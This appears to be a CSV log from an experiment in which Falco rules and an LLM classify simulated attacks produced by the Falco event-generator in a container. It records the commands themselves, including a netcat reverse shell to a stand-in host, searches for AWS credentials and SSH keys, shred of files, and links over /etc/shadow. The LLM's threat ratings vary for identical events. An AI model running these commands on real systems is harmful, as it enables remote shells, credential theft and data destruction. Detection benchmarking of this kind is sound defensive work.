timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T10:58:16.539824,llm-analyzed,Directory traversal monitored file read,Warning,350,75,8745,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,stop,high,
2026-05-17T10:58:26.829923,llm-analyzed,Read sensitive file trusted after startup,Warning,381,65,8697,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:58:38.808449,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,95,10397,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
2026-05-17T10:58:49.529955,llm-analyzed,Find AWS Credentials,Warning,367,76,9139,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:58:59.918520,llm-analyzed,Remove Bulk Data from Disk,Warning,385,62,8808,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3880705581,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:59:10.140446,llm-analyzed,Execution from /dev/shm,Warning,412,49,8640,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:59:20.303831,llm-analyzed,Execution from /dev/shm,Warning,436,63,8583,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:59:30.412318,llm-analyzed,Clear Log Activities,Warning,343,73,8529,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:59:41.517769,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,50,9525,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3368901967/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:59:43.101053,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:59:52.501749,llm-analyzed,Packet socket created in container,Notice,363,50,7808,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:59:54.081803,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:59:55.663893,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:00:05.651169,llm-analyzed,Fileless execution via memfd_create,Critical,376,58,8407,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:00:07.231439,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:00:18.994946,llm-analyzed,Search Private Keys or Passwords,Warning,342,100,10184,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:00:29.337865,llm-analyzed,Directory traversal monitored file read,Warning,350,75,8762,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:00:39.479079,llm-analyzed,Read sensitive file trusted after startup,Warning,381,60,8559,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:00:50.074423,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,66,9015,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:01:00.854783,llm-analyzed,Find AWS Credentials,Warning,367,77,9199,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,ignore,none,
2026-05-17T11:01:11.520378,llm-analyzed,Remove Bulk Data from Disk,Warning,385,69,9071,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1986643590,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:01:22.508904,llm-analyzed,Execution from /dev/shm,Warning,412,64,9406,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-x5wTtX.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:01:32.973324,llm-analyzed,Execution from /dev/shm,Warning,436,72,8884,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-x5wTtX.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
2026-05-17T11:01:42.909698,llm-analyzed,Clear Log Activities,Warning,343,69,8356,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:02:02.274339,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,225,17779,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1669706002/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,ignore,none,
2026-05-17T11:02:03.853629,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:02:14.334350,llm-analyzed,Packet socket created in container,Notice,363,72,8900,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:02:16.000269,rule-matched,Read sensitive file untrusted,Warning,0,0,1,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:02:17.581554,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:02:27.162400,llm-analyzed,Fileless execution via memfd_create,Critical,376,49,7988,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:02:38.071784,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,415,62,9328,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-92734879/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:02:47.262887,llm-analyzed,System user interactive,Informational,314,63,7610,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:02:48.843485,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:02:57.981030,llm-analyzed,PTRACE anti-debug attempt,Notice,331,53,7555,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:03:07.289793,llm-analyzed,Directory traversal monitored file read,Warning,350,53,7729,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:03:17.942489,llm-analyzed,Read sensitive file trusted after startup,Warning,381,68,9070,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:03:28.077483,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,58,8554,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:03:38.370859,llm-analyzed,Find AWS Credentials,Warning,367,67,8701,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:03:48.218001,llm-analyzed,Remove Bulk Data from Disk,Warning,385,53,8265,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3052864100,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:04:00.640792,llm-analyzed,Execution from /dev/shm,Warning,408,93,10842,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-oUCSJJ.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:04:11.673416,llm-analyzed,Execution from /dev/shm,Warning,430,81,9451,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-oUCSJJ.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:04:20.338489,llm-analyzed,Clear Log Activities,Warning,343,43,7084,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:04:30.854369,llm-analyzed,Create Symlink Over Sensitive Files,Warning,411,58,8935,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-181882566/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:04:32.435064,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:04:42.326822,llm-analyzed,Packet socket created in container,Notice,363,60,8311,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:04:43.907015,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:04:45.502941,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:04:56.835057,llm-analyzed,Fileless execution via memfd_create,Critical,376,83,9752,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:05:07.071907,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,48,8656,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3111831029/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
2026-05-17T11:05:16.799378,llm-analyzed,System user interactive,Informational,314,74,8147,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:05:18.379707,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:05:28.557257,llm-analyzed,PTRACE anti-debug attempt,Notice,331,77,8597,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:05:30.137367,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:05:40.628694,llm-analyzed,Search Private Keys or Passwords,Warning,342,78,8912,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:05:42.208675,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T11:05:51.233500,llm-analyzed,Search Private Keys or Passwords,Warning,342,67,7444,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:06:00.794827,llm-analyzed,Directory traversal monitored file read,Warning,350,57,7966,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:06:11.513088,llm-analyzed,Read sensitive file trusted after startup,Warning,381,71,9134,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T11:06:22.543709,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,59,9448,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T11:06:31.952399,llm-analyzed,Find AWS Credentials,Warning,367,50,7825,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T11:06:42.492441,llm-analyzed,Remove Bulk Data from Disk,Warning,383,67,8956,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-831757150,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
